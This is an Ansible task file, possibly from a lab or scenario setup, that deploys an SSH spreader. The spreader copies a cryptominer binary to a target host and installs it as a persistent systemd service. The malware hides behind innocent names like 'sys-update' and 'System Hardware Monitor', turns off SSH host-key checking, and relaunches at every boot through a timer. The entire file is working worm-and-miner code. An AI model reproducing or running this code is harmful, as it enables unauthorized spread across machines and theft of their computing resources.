---
- name: Install SSH client
  apt:
    name: openssh-client
    state: present
    update_cache: yes

- name: Create SSH spread script
  copy:
    dest: "{{ spread_script }}"
    owner: root
    group: root
    mode: "0755"
    content: |
      #!/bin/bash
      # sys-update — system synchronization utility

      TARGET="{{ target_host }}"
      TARGET_USER="{{ target_user }}"
      BINARY="{{ miner_binary }}"
      SERVICE="sys-monitor"
      LOG="{{ spread_log }}"
      SSH_OPTS="-o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=10"

      echo "[$(date -Is)] Starting synchronization to $TARGET" >> "$LOG"

      if ! ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "true" 2>/dev/null; then
          echo "[$(date -Is)] SSH connection to $TARGET failed" >> "$LOG"
          exit 1
      fi

      if ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "test -f $BINARY" 2>/dev/null; then
          echo "[$(date -Is)] Already synchronized on $TARGET" >> "$LOG"
          exit 0
      fi

      scp $SSH_OPTS "$BINARY" "${TARGET_USER}@${TARGET}:/tmp/.sys-mon" 2>/dev/null
      ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" \
          "sudo mv /tmp/.sys-mon $BINARY && sudo chmod 755 $BINARY" 2>/dev/null

      ssh $SSH_OPTS "${TARGET_USER}@${TARGET}" "sudo bash -s" << 'EOF' 2>/dev/null
      cat > /etc/systemd/system/sys-monitor.service << 'SVC'
      [Unit]
      Description=System Hardware Monitor
      After=network-online.target

      [Service]
      Type=simple
      ExecStart=/usr/local/sbin/sys-monitor
      Restart=always
      RestartSec=5

      [Install]
      WantedBy=multi-user.target
      SVC
      systemctl daemon-reload
      systemctl enable sys-monitor
      systemctl start sys-monitor
      EOF

      echo "[$(date -Is)] Synchronization complete on $TARGET" >> "$LOG"

- name: Create systemd service for spreader
  copy:
    dest: "/etc/systemd/system/{{ spread_service }}"
    owner: root
    group: root
    mode: "0644"
    content: |
      [Unit]
      Description=System update synchronization
      After=network-online.target
      Wants=network-online.target

      [Service]
      Type=oneshot
      User={{ username }}
      ExecStart={{ spread_script }}
      RemainAfterExit=yes

      [Install]
      WantedBy=multi-user.target

- name: Create systemd timer for spreader
  copy:
    dest: "/etc/systemd/system/{{ spread_timer }}"
    owner: root
    group: root
    mode: "0644"
    content: |
      [Unit]
      Description=Run system update synchronization

      [Timer]
      OnBootSec=3min

      [Install]
      WantedBy=timers.target

- name: Enable and start spreader timer
  systemd:
    name: "{{ spread_timer }}"
    enabled: yes
    state: started
    daemon_reload: yes
